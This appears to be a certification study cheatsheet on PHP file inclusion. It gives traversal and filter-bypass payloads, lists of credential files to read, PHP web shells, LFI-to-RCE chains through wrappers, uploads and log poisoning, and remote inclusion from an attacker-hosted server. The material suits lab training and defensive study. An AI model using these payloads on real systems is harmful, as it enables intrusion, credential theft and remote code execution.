---
title: "CWES Cheatsheet — File Inclusion"
date: 2026-03-09
categories: [Certifications, CWES]
tags: [cwes, cheatsheet, lfi, file-inclusion, php]
---

file inclusion vulnerabilities let you read (or in some cases execute) files on the server. LFI is the common one, but PHP wrappers open up a whole extra layer of exploitation.

---

## Local File Inclusion

| Command | Description |
|---|---|
| **Basic LFI** | |
| `/index.php?language=/etc/passwd` | basic LFI |
| `/index.php?language=../../../../etc/passwd` | LFI with path traversal — useful to identify valid users on target server |
| `/index.php?language=/../../../etc/passwd` | LFI with name prefix |
| `GET /index.php?language=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd` | URL-encoded path traversal |
| `/index.php?language=./languages/../../../../etc/passwd` | LFI with approved path |
| `GET /index.php?language=languages/....//....//....//....//...//flag.txt` | LFI with approved path of `languages/` in front and escaping filter |
| **LFI Bypasses** | |
| `/index.php?language=....//....//....//....//....//etc/passwd` | bypass basic path traversal filter |
| `/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64` | bypass filters with URL encoding |
| `/index.php?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]` | bypass appended extension with path truncation (obsolete) |
| `echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done` | bash script to produce the required 2048-times traversal path |
| `/index.php?language=../../../../etc/passwd%00` | bypass appended extension with null byte (obsolete) |
| `/index.php?language=php://filter/read=convert.base64-encode/resource=config` | read source code for PHP page with base64 filter |

### Important Files to Read via LFI

**Linux:**

```bash
/etc/passwd                          # Users list
/etc/shadow                          # Password hashes (if readable)
/etc/hosts                           # Internal hostnames
/etc/hostname                        # Server hostname
/home/<user>/.ssh/id_rsa             # SSH private key
/home/<user>/.ssh/authorized_keys    # SSH authorized keys
/home/<user>/.bash_history           # Command history
/var/www/html/config.php             # PHP app config (DB creds)
/var/www/html/.env                   # Environment file (creds/keys)
/var/www/html/wp-config.php          # WordPress config
/proc/self/environ                   # Environment variables
/proc/self/cmdline                   # Running process command
/proc/version                        # Kernel version
```

**Windows:**

```bash
C:\Windows\System32\drivers\etc\hosts
C:\Windows\win.ini
C:\Users\<user>\.ssh\id_rsa
C:\inetpub\wwwroot\web.config
C:\xampp\passwords.txt
C:\xampp\apache\conf\httpd.conf
```

**Web app config files (look for DB creds, API keys):**

```bash
config.php
db.php
database.php
settings.php
.env
wp-config.php
configuration.php          # Joomla
LocalSettings.php          # MediaWiki
web.config                 # IIS/.NET
```

> always read `config.php`, `.env`, `db.php` first via `php://filter` to find DB creds that can chain into SQLi or admin access.
{: .prompt-tip }

---

## LFI Filter Bypass Techniques

when basic `../` and path traversal gets blocked, try these:

| Technique | Payload | When to Use |
|---|---|---|
| Double encoding | `%252e%252e%252f` | WAF decodes once, app decodes again |
| UTF-8 encoding | `..%c0%af` or `..%ef%bc%8f` | bypass non-recursive filters |
| Dot-dot-slash variations | `....//`, `....\/`, `..././` | filter removes `../` once but not recursively |
| Backslash (Windows) | `..\..\..\..\etc\passwd` | Windows servers accept both `/` and `\` |
| URL encode dot | `%2e%2e/%2e%2e/etc/passwd` | filter blocks `..` but not encoded version |
| Double URL encode full path | `%252e%252e%252f%252e%252e%252fetc%252fpasswd` | double decode needed |
| Null byte (old PHP) | `../../../../etc/passwd%00` | PHP < 5.3.4, strips appended extension |
| Path truncation | `../../../etc/passwd/./././.[x2048]` | PHP < 5.3, exceeds path length limit, drops appended extension |

---

## Bypass Appended Extensions

some apps append an extension like `.php` to your input: `include($_GET['lang'] . '.php')` — so `../../../../etc/passwd` becomes `../../../../etc/passwd.php` which doesn't exist.

| Technique | Payload | PHP Version |
|---|---|---|
| Null byte | `../../../../etc/passwd%00` | < 5.3.4 only |
| Path truncation | `../../../../etc/passwd/./././.[x2048]` | < 5.3 only |
| php://filter (best) | `php://filter/read=convert.base64-encode/resource=config` | all versions |
| zip:// wrapper | `zip://shell.zip%23shell.php` | all versions |
| data:// wrapper | `data://text/plain;base64,PD9waHAgc3lzdGVtKC...` | needs `allow_url_include` |

> on modern PHP (5.4+), null byte and path truncation don't work. use `php://filter` — it ignores appended extensions automatically.
{: .prompt-tip }

### Quick test order for bypass

```bash
# 1. Basic
../../../../etc/passwd

# 2. Double dot-slash
....//....//....//etc/passwd

# 3. URL encoded
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd

# 4. Double URL encoded
%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd

# 5. UTF-8 overlong
..%c0%af..%c0%af..%c0%afetc/passwd

# 6. With null byte (old PHP)
../../../../etc/passwd%00

# 7. With approved path prefix
languages/....//....//....//etc/passwd
```

### LFI Quick Payload Test Order

```bash
# 1. Confirm LFI
../../../../etc/passwd

# 2. If blocked, bypass
....//....//....//etc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
%252e%252e%252f%252e%252e%252fetc%252fpasswd

# 3. Read source code (ALWAYS do this)
php://filter/read=convert.base64-encode/resource=config.php
php://filter/read=convert.base64-encode/resource=index.php

# 4. Check allow_url_include
php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini

# 5. If allow_url_include=On → instant RCE
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+&cmd=id

# 6. If Off → try log poisoning
curl -s "http://target.htb/" -A '<?php system($_GET["cmd"]); ?>'
../../../../var/log/apache2/access.log&cmd=id

# 7. Try session poisoning
../../../../var/lib/php/sessions/sess_YOUR_SESSION_ID&cmd=id
```

---

## All PHP Wrappers Reference

| Wrapper | Payload | Requires | Use |
|---|---|---|---|
| `php://filter` | `php://filter/read=convert.base64-encode/resource=config` | nothing | read source code without execution |
| `php://input` | POST body: `<?php system($_GET['cmd']); ?>` | `allow_url_include=On` | RCE via POST body |
| `data://` | `data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+&cmd=id` | `allow_url_include=On` | RCE via URL |
| `expect://` | `expect://id` | `expect` extension installed | direct command execution |
| `zip://` | `zip://shell.zip%23shell.php&cmd=id` | upload ZIP file | RCE via uploaded zip |
| `phar://` | `phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id` | upload phar as image | RCE via uploaded phar |

### Check if wrappers are enabled

```bash
# Read php.ini via LFI
curl "http://target.htb/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"

# Decode and check
echo "BASE64_OUTPUT" | base64 -d | grep allow_url_include
echo "BASE64_OUTPUT" | base64 -d | grep allow_url_fopen
echo "BASE64_OUTPUT" | base64 -d | grep disable_functions
```

> `php://filter` ALWAYS works regardless of settings. try it first to read source code — you might find creds, hidden endpoints, or other vulns in the code.
{: .prompt-tip }

### php://filter useful chains

```bash
# Read PHP file as base64 (prevents execution)
php://filter/read=convert.base64-encode/resource=index.php
php://filter/read=convert.base64-encode/resource=config.php
php://filter/read=convert.base64-encode/resource=db.php
php://filter/read=convert.base64-encode/resource=upload.php
php://filter/read=convert.base64-encode/resource=login.php

# Read without base64 (plaintext)
php://filter/resource=config.php
```

---

## LFI to RCE — PHP Wrappers

all of these turn your LFI into remote code execution. first check what's enabled, then pick the right method.

**Step 0: Always Check PHP Config First**

```bash
# Read php.ini via LFI (this always works)
curl "http://TARGET:PORT/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"

# Decode and check
echo "BASE64_OUTPUT" | base64 -d | grep allow_url_include
echo "BASE64_OUTPUT" | base64 -d | grep expect
```

| Setting | If `On` | If `Off` |
|---|---|---|
| `allow_url_include` | `data://`, `php://input`, RFI all work | blocked — use log poisoning or upload+LFI |
| `expect` extension | `expect://` works | not available (rare extension anyway) |

### Method 1: data:// wrapper (PHP shell in URL)

how it works: you base64-encode a PHP shell and put it directly in the URL. PHP decodes and executes it.

```bash
# Step 1: Encode your shell
echo -n '<?php system($_GET["cmd"]); ?>' | base64
# Output: PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+

# Step 2: Put it in the URL
/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+&cmd=id
```

requires `allow_url_include = On`. best for quick one-request RCE, no file upload needed.

### Method 2: php://input (PHP shell in POST body)

how it works: you send PHP code in the POST request body. PHP reads the body via `php://input` and executes it.

```bash
curl -s -X POST \
  --data '<?php system($_GET["cmd"]); ?>' \
  "http://TARGET:PORT/index.php?language=php://input&cmd=id"
```

requires `allow_url_include = On`. best for when URL length is limited (data:// puts everything in URL, this uses POST body instead).

### Method 3: expect:// (direct command, no PHP needed)

how it works: runs the command directly — no PHP shell code needed at all.

```bash
curl "http://TARGET:PORT/index.php?language=expect://id"
curl "http://TARGET:PORT/index.php?language=expect://whoami"
curl "http://TARGET:PORT/index.php?language=expect://cat+/flag.txt"
```

requires `expect` PHP extension installed (rare). simplest method if available — just type the command after `expect://`.

---

## LFI + Upload (when allow_url_include = Off)

these methods don't need `allow_url_include`. you upload a file with hidden PHP, then include it via LFI.

### Method 1: GIF + LFI (simplest)

how it works: hide PHP inside a fake GIF image. upload it. include it via LFI and PHP executes.

```bash
# Step 1: Create fake GIF with PHP inside
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif

# Step 2: Upload shell.gif as profile picture (normal upload)

# Step 3: Include via LFI → PHP sees GIF8 (harmless text) then executes the PHP code
/index.php?language=./profile_images/shell.gif&cmd=id
```

best for: most common method, works whenever you have upload + LFI.

### Method 2: ZIP + LFI

how it works: put PHP shell inside a ZIP. upload ZIP as `.jpg`. use `zip://` wrapper to extract and execute the PHP file inside.

```bash
# Step 1: Create shell and zip it
echo '<?php system($_GET["cmd"]); ?>' > shell.php
zip shell.jpg shell.php

# Step 2: Upload shell.jpg as profile picture

# Step 3: Use zip:// to extract and execute
# zip://FILE%23FILE_INSIDE_ZIP
# %23 = # (tells PHP which file inside the ZIP to open)
/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
```

best for: when server checks magic bytes (GIF trick might fail, but ZIP passes as binary).

### Method 3: PHAR + LFI

how it works: same concept as ZIP but uses PHP Archive format. create PHAR, rename to `.jpg`, upload, include via `phar://`.

```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->stopBuffering();
```

```bash
# Compile it
php --define phar.readonly=0 build.php

# Rename to image
mv shell.phar shell.jpg

# Upload shell.jpg

# Include via phar://
# phar://FILE%2FFILE_INSIDE_PHAR
# %2F = / (path separator inside phar)
/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
```

best for: alternative to ZIP when zip:// doesn't work.

---

## RFI — Remote File Inclusion

instead of including a local file, you include a file from YOUR server.

| Command | Description |
|---|---|
| `echo '<?php system($_GET["cmd"]); ?>' > shell.php && python3 -m http.server <LISTENING_PORT>` | host web shell |
| `/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id` | include remote PHP web shell |

### RFI Checks and Techniques

**verify RFI is possible:**

```bash
# Check allow_url_include via php://filter
curl "http://target.htb/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
echo "BASE64" | base64 -d | grep allow_url_include

# allow_url_include = On → RFI works
# allow_url_include = Off → RFI blocked, use LFI methods instead
```

**RFI via HTTP:**

```bash
# Step 1: Create shell on Kali
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Step 2: Host it
python3 -m http.server 8080

# Step 3: Include it
curl "http://target.htb/index.php?language=http://YOUR_IP:8080/shell.php&cmd=id"
```

**RFI via FTP (if HTTP is blocked):**

```bash
# Step 1: Start FTP server on Kali
sudo python3 -m pyftpdlib -p 21

# Step 2: Include via FTP
curl "http://target.htb/index.php?language=ftp://YOUR_IP/shell.php&cmd=id"
```

**RFI via SMB (Windows targets):**

```bash
# Step 1: Start SMB share on Kali
impacket-smbserver -smb2support share $(pwd)

# Step 2: Include via UNC path
curl "http://target.htb/index.php?language=\\\\YOUR_IP\\share\\shell.php&cmd=id"
```

> if HTTP RFI is blocked by firewall, try FTP or SMB — they often aren't filtered.
{: .prompt-tip }

---

## Log and Session Poisoning

| Command | Description |
|---|---|
| `PHPSESSID=nguh23jsnmkjuvesphkhoo2ptt` | example session cookie indicating log path as `/var/lib/php/sessions/sess_nguh23jsnmkjuvesphkhoo2ptt` |
| `/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd` | read PHP session parameters |
| `<?php system($_GET["cmd"]);?>` | webshell URL-encoded to `%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E` |
| `/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E` | poison PHP session with web shell |
| `/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id` | RCE through poisoned PHP session |
| `curl -s "http://<SERVER_IP>:<PORT>/index.php" -A '<?php system($_GET["cmd"]); ?>'` | poison server log |
| `/index.php?language=/var/log/apache2/access.log&cmd=id` | RCE through poisoned log |

for log poisoning to work you need: LFI to read the log + ability to inject PHP into the log.

### Linux log paths to try

```bash
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/apache/access.log
/var/log/apache/error.log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/access_log
/var/log/httpd/error_log
/var/log/syslog
/var/log/auth.log
/var/log/vsftpd.log
/var/log/mail.log
/proc/self/environ
/proc/self/fd/0
/proc/self/fd/1
/proc/self/fd/2
```

### Windows log paths

```bash
C:\xampp\apache\logs\access.log
C:\xampp\apache\logs\error.log
C:\inetpub\logs\LogFiles\W3SVC1\
C:\Windows\System32\LogFiles\
```

### PHP session paths

```bash
/var/lib/php/sessions/sess_<SESSION_ID>
/var/lib/php5/sessions/sess_<SESSION_ID>
/tmp/sess_<SESSION_ID>
C:\Windows\Temp\sess_<SESSION_ID>
```

---

## Log Poisoning Step-by-Step

### Method 1 — Apache access.log via User-Agent

```bash
# Step 1: Verify you can read the log
curl "http://target.htb/index.php?language=../../../../var/log/apache2/access.log"

# Step 2: Poison the log with PHP in User-Agent
curl -s "http://target.htb/" -A '<?php system($_GET["cmd"]); ?>'

# Step 3: Trigger the shell via LFI
curl "http://target.htb/index.php?language=../../../../var/log/apache2/access.log&cmd=id"
```

### Method 2 — PHP session poisoning

```bash
# Step 1: Check your session cookie
# Cookie: PHPSESSID=abc123def456

# Step 2: Verify you can read the session file
curl "http://target.htb/index.php?language=../../../../var/lib/php/sessions/sess_abc123def456"

# Step 3: Poison the session — put PHP in a parameter that gets stored in session
curl "http://target.htb/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E"

# Step 4: Trigger via LFI
curl "http://target.htb/index.php?language=../../../../var/lib/php/sessions/sess_abc123def456&cmd=id"
```

### Method 3 — SSH log poisoning (if SSH is open)

```bash
# Step 1: SSH with PHP payload as username
ssh '<?php system($_GET["cmd"]); ?>'@target.htb

# Step 2: Include auth.log via LFI
curl "http://target.htb/index.php?language=../../../../var/log/auth.log&cmd=id"
```

### Method 4 — Mail log poisoning (if SMTP port 25 open)

```bash
# Step 1: Send email with PHP in body
telnet target.htb 25
MAIL FROM:<attacker@evil.com>
RCPT TO:<?php system($_GET['cmd']); ?>
DATA
.
QUIT

# Step 2: Include mail log via LFI
curl "http://target.htb/index.php?language=../../../../var/log/mail.log&cmd=id"
```

### Method 5 — /proc/self/environ

```bash
# Step 1: Check if readable
curl "http://target.htb/index.php?language=../../../../proc/self/environ"

# Step 2: Send request with PHP in User-Agent
curl -s "http://target.htb/index.php?language=../../../../proc/self/environ" -A '<?php system($_GET["cmd"]); ?>'

# If HTTP_USER_AGENT is in environ output, PHP gets executed
```

---

## Fuzzing LFI Parameters and Files

### LFI Fuzzing Wordlists

| Wordlist | Use |
|---|---|
| `/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt` | best all-in-one LFI payload list |
| `/usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt` | Linux sensitive files |
| `/usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt` | Windows sensitive files |
| `/usr/share/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt` | Linux webroot paths |
| `/usr/share/seclists/Discovery/Web-Content/default-web-root-directory-windows.txt` | Windows webroot paths |
| [LFI-WordList-Linux](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux) | Linux server config files |
| [LFI-WordList-Windows](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows) | Windows server config files |
| `/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt` | parameter name discovery |

### Hosting Files for RFI

| Command | Use |
|---|---|
| `python3 -m http.server 8080` | HTTP server (for RFI via http://) |
| `sudo python3 -m pyftpdlib -p 21` | FTP server (for RFI via ftp:// when HTTP blocked) |
| `impacket-smbserver -smb2support share $(pwd)` | SMB share (for RFI on Windows targets via UNC path) |

### Step 1: Find the Vulnerable Parameter

before you can exploit LFI, you need to find which parameter is injectable.

```bash
# Fuzz for hidden parameters on a page
ffuf -c -ic -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
  -u 'http://TARGET:PORT/index.php?FUZZ=../../../../etc/passwd' -fs <default_size>
```

**Common LFI parameter names to try manually:**

```bash
?page=
?file=
?language=
?lang=
?view=
?include=
?template=
?doc=
?path=
?log=
?content=
?module=
```

### Step 2: Fuzz LFI Payloads (find which traversal works)

```bash
# Fuzz with LFI-Jhaddix wordlist (best all-in-one LFI wordlist)
ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ \
  -u 'http://TARGET:PORT/index.php?language=FUZZ' -fs <default_size>
```

this tries hundreds of `../` variations, encoding bypasses, and known file paths automatically.

### Step 3: Fuzz Webroot Path (find where web files are)

need to know the webroot to read PHP source code or find upload directory.

```bash
# Linux webroot
ffuf -w /usr/share/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ \
  -u 'http://TARGET:PORT/index.php?language=../../../../FUZZ/index.php' -fs <default_size>

# Windows webroot
ffuf -w /usr/share/seclists/Discovery/Web-Content/default-web-root-directory-windows.txt:FUZZ \
  -u 'http://TARGET:PORT/index.php?language=..\..\..\..\FUZZ\index.php' -fs <default_size>
```

**Common webroot paths:**

```bash
# Linux
/var/www/html/
/var/www/
/usr/share/nginx/html/
/srv/www/htdocs/
/opt/lampp/htdocs/

# Windows
C:\inetpub\wwwroot\
C:\xampp\htdocs\
C:\wamp\www\
```

### Step 4: Fuzz Interesting Files (configs, logs, keys)

```bash
# Fuzz for sensitive Linux files
ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt:FUZZ \
  -u 'http://TARGET:PORT/index.php?language=../../../../FUZZ' -fs <default_size>

# Fuzz for sensitive Windows files
ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt:FUZZ \
  -u 'http://TARGET:PORT/index.php?language=..\..\..\..\FUZZ' -fs <default_size>

# Fuzz server config files (Linux)
ffuf -w ./LFI-WordList-Linux:FUZZ \
  -u 'http://TARGET:PORT/index.php?language=../../../../FUZZ' -fs <default_size>
```

### Step 5: Fuzz PHP Files (find hidden pages)

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ \
  -u 'http://TARGET:PORT/FUZZ.php' -fc 404
```

finding hidden PHP pages gives you more parameters to test for LFI, SQLi, etc.

### Proxy Through Burp

```bash
ffuf -c -ic -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ \
  -u 'http://TARGET:PORT/index.php?language=FUZZ' \
  -fs <default_size> \
  -replay-proxy http://127.0.0.1:8080
```

---

## File Inclusion Functions

not all functions give you the same capabilities. this matters for knowing what's possible:

| Function | Read Content | Execute Code | Remote URL | Notes |
|---|---|---|---|---|
| **PHP** | | | | |
| `include()` / `include_once()` | yes | yes | yes | best for LFI to RCE. executes PHP + allows RFI |
| `require()` / `require_once()` | yes | yes | no | executes PHP but NO remote include |
| `file_get_contents()` | yes | no | yes | read only — can read remote URLs but won't execute PHP |
| `fopen()` / `file()` | yes | no | no | read only, local only |
| **NodeJS** | | | | |
| `fs.readFile()` | yes | no | no | read only |
| `fs.sendFile()` | yes | no | no | read only |
| `res.render()` | yes | yes | no | can execute templates (SSTI potential) |
| **Java** | | | | |
| `include` | yes | no | no | JSP include, read only |
| `import` | yes | yes | yes | full LFI+RFI+execution |
| **.NET** | | | | |
| `@Html.Partial()` | yes | no | no | local read only |
| `@Html.RemotePartial()` | yes | no | yes | can read remote but no execution |
| `Response.WriteFile()` | yes | no | no | local read only |
| `include` | yes | yes | yes | full LFI+RFI+execution |

---

[← Back to CWES Cheatsheet Index](/posts/cwes-cheatsheet/)
